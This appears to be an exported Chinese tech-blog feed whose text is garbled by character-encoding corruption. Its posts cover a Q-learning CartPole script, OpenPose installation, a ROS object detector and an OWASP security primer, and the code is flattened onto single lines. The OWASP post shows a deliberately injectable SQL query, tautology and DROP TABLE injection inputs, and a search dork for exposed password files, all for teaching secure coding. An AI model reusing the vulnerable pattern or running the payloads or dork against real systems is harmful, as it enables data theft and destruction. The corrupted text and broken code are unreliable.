è£¡é¢åªæœ‰ä¸€è™•æ¯”è¼ƒä¸ç›´è¦ºï¼Œå°±æ˜¯åœ¨æ›´æ–° Q table æ™‚ï¼Œè¨ˆç®— reward ä¸åªåŒ…å«æ¡å– action $a$ ç²å¾—çš„ reward $r$ï¼Œé‚„åŒ…å« $\gamma max_{aâ€™}Q(sâ€™, aâ€™)$ã€‚é€™å€‹æ¦‚å¿µæ˜¯ï¼Œagent ä¸åƒ…åƒ…çœ‹ç•¶ä¸‹æ¡å–çš„è¡Œå‹•å¸¶ä¾†çš„å¥½è™•ï¼Œä»–ä¹Ÿæœƒä¼°è¨ˆåˆ°é”ä¸‹ä¸€å€‹ state $sâ€™$ å¾Œï¼Œæœ€å¤šå¯ä»¥æœ‰å¤šå°‘å¥½è™•ï¼ˆå› ç‚ºåœ¨ $sâ€™$ ä¹Ÿå¯ä»¥æ¡å–å„ç¨® actionï¼‰ã€‚æ›å¥è©±èªªï¼Œé€™å€‹ agent ä¸æ˜¯ä¸€å€‹ç›®å…‰å¦‚è±†çš„ agentï¼Œä»–æœƒè€ƒæ…®æœªä¾†ã€‚å› ç‚ºåŠ ä¸Šäº† $\gamma max_{aâ€™}Q(sâ€™, aâ€™)$ (ç•¶ç„¶ï¼Œ$\gamma$ ä¸èƒ½æ˜¯ 0)ï¼Œè®“æˆ‘å€‘çš„ agent å¾ æœƒç«‹åˆ»åƒæ‰æ£‰èŠ±ç³–çš„å°æœ‹å‹ï¼Œé€²åŒ–æˆå¯ä»¥æ™šä¸€é»å†åƒå¤šä¸€é»æ£‰èŠ±ç³–çš„å°æœ‹å‹ï¼Œæ˜¯ä¸æ˜¯å¾ˆæœ‰è¶£å‘¢ï¼
ç¶“éä»¥ä¸Šçš„èªªæ˜ï¼Œå¤§å®¶æ‡‰è©²å¯ä»¥äº†è§£ Q learning æ¼”ç®—æ³•çš„æ ¸å¿ƒæ¦‚å¿µäº†ã€‚é€™æ™‚å¤§å®¶å¯èƒ½æœƒæœ‰é»ç–‘æƒ‘ï¼Œä¹‹å‰å¥½åƒæœ‰è½é Deep Q learningï¼Œé‚£è·Ÿ Q learning å·®åœ¨å“ªé‚Šå‘¢ï¼Ÿå…¶å¯¦å°±åªæ˜¯æœ‰æ²’æœ‰ä½¿ç”¨åˆ° Deep neural network è€Œå·²ï¼Œå¦‚æœä½ ç†è§£é€™å€‹æ¼”ç®—æ³•ï¼Œæ‡‰è©²ä¸é›£ç™¼ç¾ä»–çš„èƒ½åŠ›æ»¿æœ‰é™çš„ï¼Œå¾ˆé›£æ‹¿ä¾†å­¸ç¿’å®Œæˆè¤‡é›œçš„ taskï¼Œæ‰€ä»¥æ‰æœ‰äººå¼•å…¥ DNN ä¾†è®“å…¶å­¸ç¿’èƒ½åŠ›è®Šå¾—æ›´å¼·ã€‚
å¯¦ä½œ Q learningç¨‹å¼ç¢¼æ˜¯åƒè€ƒ é€™ç¯‡æ–‡ç«  ï¼Œè£¡é¢æœ‰ä»‹ç´¹è©³ç´°çš„æ€è€ƒåŠèª¿æ•´éç¨‹ã€‚æœ‰èˆˆè¶£æ·±å…¥äº†è§£çš„è®€è€…å¯ä»¥åƒè€ƒçœ‹çœ‹ã€‚
import gymimport numpy as npimport randomimport mathfrom time import sleep    ## Initialize the &quot;Cart-Pole&quot; environmentenv = gym.make(&#x27;CartPole-v0&#x27;)  ## Defining the environment related constants  # Number of discrete states (bucket) per state dimensionNUM_BUCKETS = (1, 1, 6, 3) # (x, x&#x27;, theta, theta&#x27;)# Number of discrete actionsNUM_ACTIONS = env.action_space.n # (left, right)# Bounds for each discrete stateSTATE_BOUNDS = list(zip(env.observation_space.low, env.observation_space.high))STATE_BOUNDS[1] = [-0.5, 0.5]STATE_BOUNDS[3] = [-math.radians(50), math.radians(50)]# Index of the actionACTION_INDEX = len(NUM_BUCKETS)  ## Creating a Q-Table for each state-action pairq_table = np.zeros(NUM_BUCKETS + (NUM_ACTIONS,))  ## Learning related constantsMIN_EXPLORE_RATE = 0.01MIN_LEARNING_RATE = 0.1  ## Defining the simulation related constantsNUM_EPISODES = 1000MAX_T = 250STREAK_TO_END = 120SOLVED_T = 199DEBUG_MODE = True  def simulate():  ## Instantiating the learning related parameters	learning_rate = get_learning_rate(0)explore_rate = get_explore_rate(0)discount_factor = 0.99 # since the world is unchanging  num_streaks = 0  for episode in range(NUM_EPISODES):  # Reset the environment	obv = env.reset()  # the initial statestate_0 = state_to_bucket(obv)  for t in range(MAX_T):	env.render()  # Select an action	action = select_action(state_0, explore_rate)  # Execute the actionobv, reward, done, _ = env.step(action)  # Observe the resultstate = state_to_bucket(obv)  # Update the Q based on the resultbest_q = np.amax(q_table[state])q_table[state_0 + (action,)] += learning_rate*(reward + discount_factor*(best_q) - q_table[state_0 + (action,)])  # Setting up for the next iterationstate_0 = state  # Print dataif (DEBUG_MODE):	print(&quot;\nEpisode = %d&quot; % episode)	print(&quot;t = %d&quot; % t)	print(&quot;Action: %d&quot; % action)	print(&quot;State: %s&quot; % str(state))	print(&quot;Reward: %f&quot; % reward)	print(&quot;Best Q: %f&quot; % best_q)	print(&quot;Explore rate: %f&quot; % explore_rate)	print(&quot;Learning rate: %f&quot; % learning_rate)	print(&quot;Streaks: %d&quot; % num_streaks)  	print(&quot;&quot;)  	if done:	print(&quot;Episode %d finished after %f time steps&quot; % (episode, t))	if (t &gt;= SOLVED_T):		num_streaks += 1		else:		num_streaks = 0		break  #sleep(0.25)  # It&#x27;s considered done when it&#x27;s solved over 120 times consecutively		if num_streaks &gt; STREAK_TO_END:		break  # Update parameters		explore_rate = get_explore_rate(episode)learning_rate = get_learning_rate(episode)    def select_action(state, explore_rate):# Select a random action	if random.random() &lt; explore_rate:	action = env.action_space.sample()# Select the action with the highest qelse:action = np.argmax(q_table[state])return action    def get_explore_rate(t):	return max(MIN_EXPLORE_RATE, min(1, 1.0 - math.log10((t+1)/25)))  	def get_learning_rate(t):		return max(MIN_LEARNING_RATE, min(0.5, 1.0 - math.log10((t+1)/25)))  		def state_to_bucket(state):			bucket_indice = []			for i in range(len(state)):				if state[i] &lt;= STATE_BOUNDS[i][0]:				bucket_index = 0				elif state[i] &gt;= STATE_BOUNDS[i][1]:				bucket_index = NUM_BUCKETS[i] - 1				else:# Mapping the state bounds to the bucket array				bound_width = STATE_BOUNDS[i][1] - STATE_BOUNDS[i][0]				offset = (NUM_BUCKETS[i]-1)*STATE_BOUNDS[i][0]/bound_width				scaling = (NUM_BUCKETS[i]-1)/bound_width				bucket_index = int(round(scaling*state[i] - offset))bucket_indice.append(bucket_index)return tuple(bucket_indice)  if __name__ == &quot;__main__&quot;:simulate()

ç¸½çµé€™ç¯‡æ–‡ç« è·Ÿå¤§å®¶èªªæ˜äº† OpenAI Gym è£¡é¢çš„åŸºæœ¬çµ„æˆï¼Œä¹Ÿä»‹ç´¹äº† Q learning æ¼”ç®—æ³•åŠå¯¦ä½œã€‚æœ‰èˆˆè¶£æ›´æ·±å…¥ç ”ç©¶çš„è®€è€…å¯ä»¥ä»¥æ­¤ç‚ºåŸºç¤ï¼Œç¹¼çºŒé‘½ç ”ã€‚
å»¶ä¼¸é–±è®€
ä»€éº¼æ˜¯å¼·åŒ–å­¸ç¿’
rllab - a framework for developing and evaluating reinforcement learning algorithms

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨å­¸ç¿’çœ‹æ¸…äº‹ç‰©çš„æœ¬è³ªèˆ‡æ”¹é€²è‡ªå·±çš„è§€å¿µ
]]></content>
      <tags>
        <tag>Reinforcement Learning</tag>
        <tag>OpenAI Gym</tag>
        <tag>Q Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦‚ä½•åœ¨ Windows å®‰è£ OpenPose è·Ÿä½¿ç”¨ Python API ä¾†åµæ¸¬äººé«”å§¿æ…‹</title>
    <url>/2019/01/18/openpose-installation/</url>
    <content><![CDATA[å‰è¨€
OpenPose æ˜¯ Carnegie Mellon Universityï¼ˆCMUï¼‰è«–æ–‡å¯¦ä½œçš„é–‹æºå‡½å¼åº«ï¼Œæä¾›çš„åŠŸèƒ½ä¸»è¦å°±æ˜¯å¯ä»¥åµæ¸¬äººé«”çš„å„éƒ¨ä½åœ¨ä»€éº¼åœ°æ–¹ï¼Œä¾‹å¦‚å¯ä»¥åœ¨å½±åƒä¸­æ‰¾åˆ°è‡‰ã€èº«é«”ã€æ‰‹ç­‰ç­‰åœ°æ–¹çš„ç‰¹å¾µé»ã€‚ä½†ä»–å²å®³çš„åœ°æ–¹åœ¨æ–¼å¯ä»¥ä¸€æ¬¡åµæ¸¬å¾ˆå¤šäººï¼Œçœ‹çœ‹ä¸‹é¢é€™å¼µåœ–å°±çŸ¥é“ï¼š

é€™å€‹ repository ä»ç„¶ç›¸ç•¶åœ° activeï¼Œæœ‰å…©å€‹ CMU çš„å­¸ç”Ÿå¸¸å¸¸åœ¨ Github ä¸Šé¢è§£ issueã€‚é€™æ¬¡å› ç‚ºç­†è€…éœ€è¦åœ¨ Windows ä¸Šé¢å®‰è£ OpenPose ä¸¦å‘¼å« Python APIï¼Œæ‰€ä»¥è·Ÿé–‹ç™¼è€…æœ‰ä¸å°‘äº’å‹•ï¼Œæ‰æƒ³åˆ°ä¹¾è„†ä¾†å¯«ä¸€ç¯‡æ•™å­¸ï¼Œè®“ä¹‹å¾Œæƒ³è¦ä½¿ç”¨ OpenPose çš„è®€è€…å¯ä»¥çœå»å¥½å¹¾å¤©çš„ç’°å¢ƒå®‰è£ debugã€‚
OpenPose æ¼”ç®—æ³•ç°¡ä»‹
ä¸Šé¢æ˜¯ OpenPose çš„æ¶æ§‹åœ–ï¼Œè¼¸å…¥æœƒæ˜¯ä¸€å¼µå¤§å°ç‚º w x h çš„å½©è‰²å½±åƒï¼›æ¥è‘—æœƒå…ˆç¶“é Stage 0 çš„ VGG-19 Networkï¼Œå¾—åˆ°è¼¸å…¥å½±åƒçš„ feature mapï¼›ç„¶å¾Œæœƒåœ¨ Stage 1 ç¶“éä¸€äº› CNN ä¾†å¾—åˆ°èº«é«”å„éƒ¨ä½çš„ confidence mapã€‚Stage 1 åˆ†æˆå…©å€‹ branchï¼Œbranch 1 å¯ä»¥ç”¢ç”ŸæŸç‰¹å®šéƒ¨ä½çš„ confidence mapï¼Œä¾‹å¦‚å·¦è‚©çš„ confidence mapï¼š

branch 2 å‰‡æ˜¯ç”¢ç”Ÿä¸åŒèº«é«”éƒ¨ä½ä¹‹é–“çš„é—œè¯æ€§ï¼Œä¾‹å¦‚è„–å­è·Ÿå·¦è‚©çš„é—œä¿‚ï¼š

æœ€å¾Œçµåˆé€™äº›çµæœå°±å¯ä»¥å¾—åˆ°å…¨èº«å„éƒ¨ä½å¤§è‡´åœ¨ä»€éº¼åœ°æ–¹ï¼Œé‚„æœ‰å½¼æ­¤ç›¸å°ä½ç½®çš„é—œä¿‚ã€‚ä»¥ä¸Šçš„è¬›æ³•æœ‰é»éæ–¼ç°¡åŒ–ï¼Œæœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥çœ‹çœ‹å»¶ä¼¸é–±è®€ 1 çš„åŸå§‹è«–æ–‡ã€‚
Windows å®‰è£æ­¥é©Ÿ
ç¢ºèªä¸€ä¸‹ä½ çš„ç¡¬é«”è·Ÿä½œæ¥­ç³»çµ±ç¬¦åˆ OpenPose è¦æ±‚

Clone OpenPose çš„åŸå§‹ç¢¼
å› ç‚ºæˆ‘å€‘è¦ä½¿ç”¨ Python APIï¼Œæ‰€ä»¥ä¸èƒ½åªæ˜¯ä¸‹è¼‰å·²ç¶“ç·¨è­¯å¥½çš„ library æ–‡ä»¶ï¼Œå¿…é ˆè¦å¾åŸå§‹ç¢¼é–‹å§‹ç·¨è­¯ã€‚æˆ‘æ¨è–¦å¤§å®¶å¯ä»¥ç”¨ Github Desktop ä¾†ä¸‹è¼‰åŸå§‹ç¢¼ &amp; ç®¡ç†ã€‚

ä¸‹è¼‰ä¸¦å®‰è£ CMake GUI
å¯ä»¥ä¸Š CMake çš„ç¶²ç«™ä¸‹è¼‰ï¼ŒWindows çš„è©±è«‹ä¸‹è¼‰ cmake-X.X.X-win64-x64.msiã€‚

å®‰è£ Visual Studio 2015
OpenPose çš„å®˜æ–¹è¦æ±‚æ˜¯ Visual Studio 2015 Enterprise Update 3ï¼Œä½†ä¼¼ä¹ä¹Ÿæœ‰äººç”¨ Visual Studio 2015 Community å®‰è£æˆåŠŸã€‚ç­†è€…æ˜¯ç”¨ Enterprise ç‰ˆæœ¬å®‰è£æˆåŠŸçš„ã€‚

å®‰è£ CUDA
å®˜æ–¹æ¨è–¦çš„ç‰ˆæœ¬æ˜¯ CUDA 8ã€‚é€™ä¸€æ­¥è¦åœ¨å®‰è£å®Œ Visual Studio ä¹‹å¾Œåšï¼Œå› ç‚ºå®‰è£éç¨‹æœƒç”¢ç”Ÿä¸€äº› Visual Studio éœ€è¦çš„æª”æ¡ˆã€‚

å®‰è£ cuDNN
å®˜æ–¹å»ºè­°å®‰è£ 5.1 ç‰ˆæœ¬ã€‚å®‰è£æ–¹æ³•å¾ˆç°¡å–®ï¼Œåªè¦æŠŠä¸‹è¼‰çš„å£“ç¸®æª”å…§å®¹è§£å£“ç¸®åˆ° C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v8.0 è·¯å¾‘å°±å¥½ã€‚ï¼ˆcuDNN å£“ç¸®æª”è£¡é¢æœƒæœ‰ä¸‰å€‹è³‡æ–™å¤¾ï¼Œå¯ä»¥å°æ‡‰åˆ° C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v8.0 è£¡é¢ä¹Ÿæœ‰çš„è³‡æ–™å¤¾ï¼Œåˆ†åˆ¥æŠŠæª”æ¡ˆæ”¾åˆ°å°æ‡‰çš„è³‡æ–™å¤¾å°±å¥½ï¼‰ã€‚

é–‹å§‹è¨­å®š CMake ä¾†æº–å‚™ç·¨è­¯éœ€è¦çš„æª”æ¡ˆ

è¨­å®šæª”æ¡ˆè·¯å¾‘ï¼ˆåœ¨ clone ä¸‹ä¾†çš„è·¯å¾‘ä¸­è‡ªå·±å‰µä¸€å€‹ build è³‡æ–™å¤¾ï¼Œä¸¦è¨­å®šæˆ Where to build the binariesï¼‰

æŒ‰ä¸‹ Configure æŒ‰éˆ•ï¼ˆgenerator è¨˜å¾—é¸ Visual Studio 14 2015 Win64ï¼‰




ã€€    

ç­‰å¾… Configure Done   

å‹¾é¸ BUILD_PYTHON   

æŒ‰ä¸‹ Generate



ç”¨ Visual Studio 2015 æ‰“é–‹ build/OpenPose.sln æª”æ¡ˆ
åˆ‡æ›åˆ° Release Mode ä¸¦ Build Project

é€™ä¸€æ­¥å¾ˆé‡è¦ï¼Œå› ç‚ºåªç”¨ Debug Mode build æœƒè®“å¾Œé¢çš„ Python API å•Ÿå‹•å¤±æ•—ã€‚è©³è¦‹ issue 1026ã€‚
Python API å‘¼å«æ­¥é©Ÿå¦‚æœä¸Šé¢çš„æ­¥é©Ÿéƒ½åšå®Œï¼Œæ‡‰è©²å¯ä»¥åœ¨ openpose\build\python\openpose\Release çœ‹åˆ° openpose_python.cp36-win_amd64.pyd library æ–‡ä»¶ã€‚ï¼ˆOpenPose åŸç”Ÿæ˜¯ç”¨ C++ å¯«çš„ï¼Œæ˜¯ç”¨ pybind11 åŒ…æˆ Python å¯ä»¥å‘¼å«çš„ libraryï¼‰ã€‚
æ¥è‘—ï¼Œæˆ‘å€‘æº–å‚™è¦ä¾†è·‘ openpose\build\examples\tutorial_api_python\1_body_from_image.pyï¼Œè¦è¨˜å¾—æŠŠè£¡é¢çš„ library æœå°‹è·¯å¾‘æ”¹æˆè‡ªå·±çš„ï¼š
æˆ‘å¯ä»¥è·‘èµ·ä¾†çš„ç¯„ä¾‹å¦‚ä¸‹ï¼š
# Import Openpose (Windows/Ubuntu/OSX)dir_path = os.path.dirname(os.path.realpath(__file__))try:# Windows Importif platform == &quot;win32&quot;:# Change these variables to point to the correct folder (Release/x64 etc.)sys.path.append(dir_path + &#x27;/../../python/openpose/Release&#x27;);os.environ[&#x27;PATH&#x27;] = os.environ[&#x27;PATH&#x27;] + &#x27;;&#x27; + dir_path + &#x27;/../../x64/Release;&#x27; + dir_path + &#x27;/../../bin;&#x27;import openpose_python as op

é€™æ™‚ï¼Œä½ å°±å¯ä»¥å» cmd.exe åŸ·è¡Œï¼ŒåŸ·è¡Œä¸‹åˆ—æ­¥é©Ÿ
::åˆ‡æ›åˆ°ä½ è‡ªå·±çš„ openpose è·¯å¾‘cd openpose\build\examples\tutorial_api_pythonpython 1_body_from_image.py

ç„¶å¾Œè·‘å‡ºä¸‹é¢çš„çµæœï¼š
ç¸½çµä»Šå¤©è·Ÿå¤§å®¶ä»‹ç´¹äº† CMU çš„ OpenPose è¦æ€éº¼å®‰è£ï¼Œä¹Ÿç¨å¾®ä»‹ç´¹äº† Python API è¦æ€éº¼ä½¿ç”¨ï¼Œç†è«–ä¸Šå­¸å®Œé€™ç¯‡æ•™å­¸çš„å…§å®¹å¾Œï¼Œä½ å°±å¯ä»¥ç”¨ Python å‘¼å« OpenPose çš„ API ä¾†å¯¦ä½œè‡ªå·±æƒ³è¦çš„æ›´é«˜éšåŠŸèƒ½äº†ã€‚å¸Œæœ›å°ä½ çš„ç ”ç©¶æˆ– project æœ‰å¹«åŠ©ï¼
å»¶ä¼¸é–±è®€
Convolutional Pose Machines

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚
]]></content>
      <tags>
        <tag>Robotics</tag>
        <tag>Deep Learning</tag>
        <tag>Computer Vision</tag>
        <tag>OpenPose</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€èµ·ä¾†ç© OSRF çš„ TensorFlow Object Detector</title>
    <url>/2018/02/24/osrf-tensorflow-object-detector/</url>
    <content><![CDATA[å‰è¨€ä¸Šæ¬¡æˆ‘å€‘ä¸€èµ· ä½¿ç”¨ TensorFlow ä¾†åšç°¡å–®çš„æ‰‹å¯«æ•¸å­—è¾¨è­˜ï¼Œé›–ç„¶æˆ‘å€‘å¯ä»¥è‡ªå·±ä½¿ç”¨é€™äº› API å…œè‡ªå·±çš„æ¨¡çµ„ï¼Œä½†æˆ‘å€‘ä¹Ÿå¯ä»¥åˆ©ç”¨ç¾æˆçš„å·¥å…·ï¼Œç¯€çœé–‹ç™¼æ™‚é–“ã€‚
å®‰è£å®‰è£æ­¥é©Ÿå¯ä»¥åƒè€ƒå®˜æ–¹çš„ READMEæ–‡ä»¶ã€‚æˆ‘è‡ªå·±æ˜¯åœ¨ Ubuntu 14.04 + Indigo æ¸¬è©¦éï¼Œä¹Ÿ OKï¼Œåªè¦è¨˜å¾—å°‡ä¸€äº›å®‰è£ kinetic package çš„åœ°æ–¹æ›´æ–°æˆ indigo å°±å¥½ã€‚ä¾‹å¦‚ç¬¬äºŒæ­¥çš„ camera dependenciesï¼š
sudo apt-get install ros-indigo-usb-cam ros-indigo-openni2-launch

çœŸå¯¦ç’°å¢ƒæ¸¬è©¦å®‰è£æˆåŠŸä¹‹å¾Œï¼Œç«‹åˆ»å°±ä¾†è©¦è©¦çœ‹çœŸå¯¦ç’°å¢ƒä¸‹çš„æ¸¬è©¦çµæœï¼ŒåŸ·è¡Œ launch æª”ä¹‹å¾Œï¼Œæ‡‰è©²å°±å¯ä»¥çœ‹åˆ°è·³å‡ºå¦‚ä¸‹è¦–çª—ï¼Œé¡¯ç¤ºå‡ºè¾¨è­˜çš„ç‰©é«”ã€‚

æˆ‘å€‘éƒ½çŸ¥é“ï¼Œè¦åš object recognition æœ‰å¾ˆå¤šç¨®ä¸åŒçš„ neural network å¯ä»¥ç”¨ï¼Œé€™å€‹ package é è¨­æ˜¯ä½¿ç”¨ Single Shot Detectorï¼ŒSSD ä¸»è¦çš„å„ªé»åœ¨æ–¼é€Ÿåº¦ï¼Œæ ¹æ“šä»–å€‘åœ¨ PASCAL VOCã€MS COCOã€ILSVRC ç­‰ Dataset æ¸¬è©¦çš„çµæœï¼ŒSSD çš„æº–ç¢ºåº¦è·Ÿ region proposals çš„æ–¹æ³•å·®ä¸å¤šï¼Œä½†é€Ÿåº¦å¿«å¾ˆå¤šã€‚è©³ç´°ä»‹ç´¹å¯ä»¥åƒè€ƒé€™ç¯‡æ–‡ç« ã€‚
æ›ä¸€å€‹ä¸åŒçš„ modelæ¥ä¸‹ä¾†è®“æˆ‘å€‘ä¾†å˜—è©¦æ›æ›ï¼Œå…¶å¯¦åªè¦ç·¨è¼¯ detect_ros.py è£¡é¢çš„ MODEL_NAME å°±å¥½ã€‚é¦–å…ˆï¼Œæˆ‘å€‘å…ˆåˆ° tensorflow çš„ detection model zooï¼Œæˆ‘ä¸‹è¼‰äº† ssd_inception_v2_coco çš„ tar.gz æª”ã€‚æŠŠè£¡é¢çš„ model è§£å£“ç¸®åˆ° tensorflow_object_detector&#x2F;data&#x2F;models å¾Œï¼Œå†å»æ”¹ detect_ros.py è£¡é¢çš„ MODEL_NAMEï¼š
# What model to use#MODEL_NAME = &#x27;ssd_mobilenet_v1_coco_11_06_2017&#x27;MODEL_NAME = &#x27;ssd_inception_v2_coco_2017_11_17&#x27;


å› ç‚ºç­†è€…åœ¨æ› model çš„æ™‚å€™ï¼Œå·²ç¶“é›¢æ‹ä¸Šåœ–å¥½ä¸€å°é™£å­ï¼Œæ‰€ä»¥ä¸Šåœ–çš„é¦™è•‰å·²ç¶“è¢«ç­†è€…åƒæ‰ï¼Œå ´æ™¯ä¹Ÿè®Šäº†ã€‚
é‚£å¦‚æœä½ æ˜¯æƒ³è¦æ›´æ–°è¾¨è­˜ç‰©é«”çš„ç¨®é¡ï¼Œé‚£å°±æ›´æ–° detect_ros.py è£¡é¢çš„ LABEL_NAMEï¼Œé€™å°±ä¸è´…è¿°äº†ã€‚
ç¸½çµä»Šå¤©æˆ‘å€‘ç©äº†ä¸€å€‹ OSRF çš„ Object Detectorï¼Œå¦‚æœæœ‰æƒ³è¦åšè‡ªå·±çš„æ©Ÿå™¨äººæ‡‰ç”¨ï¼Œéœ€è¦ç”¨åˆ°ç‰©é«”è¾¨è­˜åŠŸèƒ½ï¼Œä¸å¦¨å°±ç›´æ¥æ‹¿é€™å€‹ package ä¾†ç”¨ç”¨ï¼Œå°±ç®—ä½ è¦ºå¾—ç¾æœ‰çš„ model éƒ½ä¸å¤ªå¥½ç”¨ï¼Œæƒ³è‡ªå·±é‡æ–° train ä¸€å€‹æˆ– finetune ä¸€å€‹ä¾†ç¬¦åˆè‡ªå·±çš„ä½¿ç”¨å ´æ™¯ï¼Œä¹Ÿé‚„æ˜¯å¯ä»¥åˆ©ç”¨é€™å€‹ packageï¼ŒæŠ½æ›æ‰ model å°±å¥½ï¼Œå¯ä»¥çœä¸‹ä¸å°‘æ™‚é–“ã€‚
å»¶ä¼¸é–±è®€
ç‚ºä»€éº¼ SSD(Single Shot MultiBox Detector) å°å°ç›®æ¨™çš„æª¢æ¸¬æ•ˆæœä¸å¥½ï¼Ÿ

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚
]]></content>
      <tags>
        <tag>ROS</tag>
        <tag>TensorFlow</tag>
        <tag>Object Recognition</tag>
      </tags>
  </entry>
  <entry>
    <title>Top issues on OWASP</title>
    <url>/2017/05/07/owasp/</url>
    <content><![CDATA[ä»Šå¤©ä¾†è¬›è¬› web application securityã€‚åŸºæœ¬ä¸Šé€™ç¯‡è¬›çš„æ˜¯æ‰€æœ‰é–‹ç™¼è€…éƒ½è¦çŸ¥é“çš„æœ€åŸºæœ¬çŸ¥è­˜ã€‚æœ€è¿‘é›»è…¦å·¥ç¨‹é ˜åŸŸå¯¦åœ¨å¤ªéç«ç´…ï¼Œç¶²é é–‹ç™¼æ›´æ˜¯å‰ä»†å¾Œç¹¼ï¼Œä½†ä¸¦ä¸æ˜¯æ¯å€‹é–‹ç™¼è€…éƒ½å°ç¶²è·¯å®‰å…¨æœ‰ senseï¼Œå¦‚æœä½ æœå°‹ â€œpassword ext:xlsâ€ å°±æœƒç™¼ç¾æŒºå¤šä¸å¯æ€è­°çš„é€£çµã€‚

ä½†èª°ç„¡å¹´å°‘ï¼Œèª°ä¸è¼•ç‹‚ã€‚çœ‹å®Œå¾ŒæŠŠå†·æ±—æ“¦ä¸€æ“¦ï¼Œè®“é€™ç¯‡æ–‡ç« ä»‹ç´¹ç›®å‰æœ€å¸¸è¦‹çš„å¹¾å€‹å®‰å…¨å•é¡Œã€‚
OWASPè¬›åˆ°ç¶²è·¯å®‰å…¨ä¸€å®šè¦çŸ¥é“çš„ Project OWASP: Open Web Application Security Projectã€‚è£¡é¢ä»‹ç´¹äº†å„ç¨®ä¸åŒçš„ç¶²è·¯å®‰å…¨å•é¡Œã€æ¯å¹¾å¹´çš„åå¤§å®‰å…¨å•é¡Œæ’åè·Ÿç¯„ä¾‹ï¼Œå®Œå…¨å…è²»ï¼ŒåŸºæœ¬ä¸Šæ˜¯æ‰€æœ‰åš security çš„è–ç¶“ã€‚
å€¼å¾—ä¸€æçš„æ˜¯ä»–å€‘æ¯å¹¾å¹´å°±æœƒçµ±è¨ˆæœ€å¸¸è¦‹çš„ç¶²è·¯å®‰å…¨å•é¡Œï¼Œå…ˆä¾†çœ‹ä¸€ä¸‹ 2010 çš„è·Ÿ 2013 çš„( 2013 æ˜¯æœ€æ–°çš„ list )ã€‚


åŸºæœ¬ä¸Šæ¦œä¸Šæœ‰åçš„éƒ½æŒºå›ºå®šçš„ï¼ŒåŠ‰ä¼¯æº«èªªå¿ è‡£è¦æ¯”å¥¸è‡£æ›´å¥¸ï¼Œè¦æ“‹ä½é§­å®¢çš„å”¯ä¸€æ–¹å¼å°±æ˜¯æ¯”é§­å®¢å²å®³ã€‚ä»Šå¤©å°±ä¾†ç­è§£ä¸€ä¸‹é€™äº›åˆ°åº•æ˜¯ä»€éº¼ã€‚ä»¥ä¸‹çš„ code sample ä¸»è¦ä¾†è‡ªæ–¼ AppsecTutorialSeriesã€‚
A1: SQL Injectionå…¶å¯¦ Injection åŒ…å«äº†å¾ˆå¤šç¨®ï¼Œé™¤äº† SQL injection ä¹‹å¤–é‚„æœ‰ code injectionã€os command injectionã€xml injection ç­‰ç­‰ã€‚ä½†æœ€æƒ¡åæ˜­å½°çš„ç•¶ç„¶å°±æ˜¯ sql injectionã€‚ç°¡å–®çš„ code å¦‚ä¸‹
void queryDB(string name)&#123;	string sql = &quot;select * from users where name = &#x27;&quot; + name + &quot;&#x27;&quot;;	doQuery(sql);&#125;

å¾ˆå¥½ï¼Œç°¡å–®æ˜“æ‡‚ã€‚
å¦‚æœ server æ‹¿åˆ°çš„ name æ˜¯ Johnï¼Œé‚£ sql å°±æ˜¯ â€œselect * from users where name &#x3D; Johnâ€ã€‚
å¦‚æœ server æ‹¿åˆ°çš„ name æ˜¯ Steveï¼Œé‚£ sql å°±æ˜¯ â€œselect * from users where name &#x3D; Steveâ€ã€‚
å¦‚æœ server æ‹¿åˆ°çš„ name æ˜¯ John or 1 &#x3D; 1ï¼Œé‚£ sql å°±æ˜¯ â€œselect * from users where name &#x3D; John or 1 &#x3D; 1â€ã€‚
é€™ä¸‹ high äº†ï¼Œå› ç‚º where çš„ condition always trueã€‚ç¬¬ä¸‰å€‹ sql å›å‚³ database çš„æ‰€æœ‰ row çš„æ‰€æœ‰ columnã€‚

ç¾åœ¨é‚„ç¬‘å¾—å‡ºä¾†ï¼Œé‚£è¦æ˜¯ server æ‹¿åˆ°çš„ name æ˜¯ **John;DROP TABLE users;**ã€‚

è¦æ˜¯é€™çœŸçš„ç™¼ç”Ÿäº†æ€éº¼è¾¦ï¼Œåˆ¥æ€•ï¼é€™æ™‚å€™é‚„æœ‰ä¸€å€‹è¾¦æ³•ï¼Œè¶•å¿«ä¸Šé€™å€‹ç¶²ç«™ Linkedin æ‰¾ä»½æ–°å·¥ä½œå§ï¼ä½ çš„ user éƒ½ä¸è¦‹äº†ã€‚
